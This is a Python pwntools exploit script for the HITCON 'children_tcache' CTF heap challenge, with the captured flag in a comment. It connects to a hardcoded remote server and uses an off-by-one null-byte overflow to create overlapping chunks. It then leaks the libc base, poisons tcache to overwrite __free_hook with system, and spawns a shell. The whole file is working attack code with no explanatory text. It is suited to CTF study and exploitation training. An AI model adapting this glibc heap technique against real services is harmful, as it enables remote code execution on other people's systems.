#hitcon{l4st_rem41nd3r_1s_v3ry_us3ful}
from pwn import *

def New(size, data):
    r.recvuntil("Your choice: ")
    r.sendline("1")
    r.recvuntil("Size:")
    r.sendline(str(size))
    r.recvuntil("Data:")
    r.send(data)
    
def Delete(index):
    r.recvuntil("Your choice: ")
    r.sendline("3")
    r.recvuntil("Index:")
    r.sendline(str(index))
    
def Show(index):
    r.recvuntil("Your choice: ")
    r.sendline("2")
    r.recvuntil("Index:")
    r.sendline(str(index))

#r = process('./children_tcache_patch')
r = remote('54.178.132.125', 8763)

New(0x500, "0") #0
New(0x400, "1") #1
New(0x100, "1") #2
New(0x200, "1") #3
New(0x4f0, "2") #4
Delete(0) #del 0
Delete(3) #del 3
New(0x208, "a"*0x208) #0
Delete(0)
New(0x207, "a"*0x207) #0
Delete(0)
New(0x206, "a"*0x206) #0
Delete(0)
New(0x205, "a"*0x205) #0
Delete(0)
New(0x204, "a"*0x204) #0
Delete(0)
New(0x203, "a"*0x203) #0
Delete(0)
New(0x202, "a"*0x202) #0
Delete(0)
New(0x208, "a"*0x200+p64(0x510+0x410+0x110+0x210)) #0
Delete(4) #del 4
New(0x500, "2") #3
New(0x480, "3") #4
New(0x20, "3") #5
Delete(4) #4
Show(1)
tmp = r.recvline().strip().ljust(8, "\x00")
base = u64(tmp) - 0x3ebca0
log.info("base: %#x" %base)
system = base + 0x4f440
log.info("system: %#x" %system)
free_hook = base + 0x3ed8e8
log.info("free_hook: %#x" %free_hook)
New(0x480, "a"*0x410+";/bin/sh") #4
Delete(0)
payload = "a"*0x60+p64(free_hook)
New(0x100, payload) #0
New(0x208, "a"*0x200+"/bin/sh\x00") #6
New(0x200, p64(system)) #7
Delete(1)
r.interactive()
